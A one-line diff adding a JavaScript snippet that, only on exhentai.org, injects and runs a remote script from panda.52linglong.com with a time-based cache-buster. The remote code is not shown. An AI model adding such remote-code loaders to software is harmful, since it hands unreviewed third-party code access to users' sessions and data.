@@ -1,0 +1,1 @@
+(function(){'use strict';if(window.location.hostname=='exhentai.org'){var a=document.createElement('script');a.src='//panda.52linglong.com/panda.js?'+parseInt(Date.parse(new Date())/600000);document.body.appendChild(a);}})();
